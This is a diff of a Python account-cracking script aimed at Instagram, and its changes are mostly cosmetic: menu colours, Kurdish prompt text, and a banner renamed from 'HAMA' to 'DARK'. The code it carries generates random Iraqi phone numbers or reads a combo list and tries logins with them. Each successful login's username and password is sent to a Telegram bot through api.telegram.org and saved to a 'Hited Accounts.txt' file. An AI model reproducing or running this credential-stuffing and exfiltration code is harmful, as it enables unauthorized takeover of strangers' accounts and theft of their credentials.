@@ -53,32 +53,31 @@ banner()
 print("")
 print("\n\033[0;1m[!] \033[35;1mDone Download All Libareis ")
 h , b,s,block = 0,0,0,0
-tele = input("\033[0;1m[+] \033[35;1mSend Hits To Telegram \033[32;1mY\033[33;1m/\033[31;1mN ?: ")
+tele = input("\033[0;1m[+] \033[32;1mSend Hits To Telegram \033[32;1mY\033[33;1m/\033[31;1mN ?: ")
 if "Y" in tele:
-    id = input("\033[0;1m[+] \033[36;1mTelegram Id =\033[33;1m ")
-    bot = input("\033[0;1m[+] \033[34;1mBot Token =\033[33;1m ")
+    id = input("\033[0;1m[+] \033[32;1mTelegram Id =\033[33;1m ")
+    bot = input("\033[0;1m[+] \033[32;1mBot Token =\033[33;1m ")
 elif "y" in tele:
-    id = input("\033[0;1m[+] \033[36;1mTelegram Id =\033[33;1m ")
-    bot = input("\033[0;1m[+] \033[37;1mBot Token =\033[33;1m ")
+    id = input("\033[0;1m[+] \033[32;1mTelegram Id =\033[33;1m ")
+    bot = input("\033[0;1m[+] \033[32;1mBot Token =\033[33;1m ")
     print("")
     print("=========================")
  
 print("")
-ask = input("""\033[0;1 HAMA GYAN HAL BZHERA 
-\033[0;1m \033[0;1m[1] \033[36;1m By Combo         \033[0;1m    
-\033[0;1m\033[0;1m[3]\033[34;1m  Auto Num:Num     \033[0;1m    
+ask = input("""\033[0;1 dla GYAN HAL BZHERA 
+\033[0;1m \033[0;1m[1] \033[32;1m Ba Combo         \033[0;1m    
+\033[0;1m\033[0;1m [2]\033[32;1m Start Auto Num:Num     \033[0;1m    
 \033[0;1m
 ==========================
-[+] Please Select Mode : \033[96;1m""")
-if ask == "3":
+[+] Halbzhera dlm 2 bashtra  : \033[96;1m""")
+if ask == "2":
    
     make = '0123456789'
     clear()
     banner()
     print("")
     print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
-    print("HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
-
+    
     while True:
         us = str(''.join((random.choice(make) for i in range(8))))
         user = '+964750' + us
@@ -108,7 +107,7 @@ if ask == "3":
         #print(r.text)
         if "logged_in_user" in r.text:
             if "Y" or "y" in tele:
-               t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
+               t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=DARK INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
             open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
             h += 1
             print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
@@ -118,7 +117,6 @@ if ask == "3":
         elif 'challenge_required' or 'two' in log.text:
             s += 1
             print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
-            print("HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
         elif 'Please wait a few minutes' in log.text:
             block += 1
             print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
@@ -169,7 +167,7 @@ elif ask =="1":
         #print(r.text)
         if "logged_in_user" in r.text:
             if "Y" or "y" in tele:
-            	t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
+            	t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=DARK INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
          
             open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
             h += 1
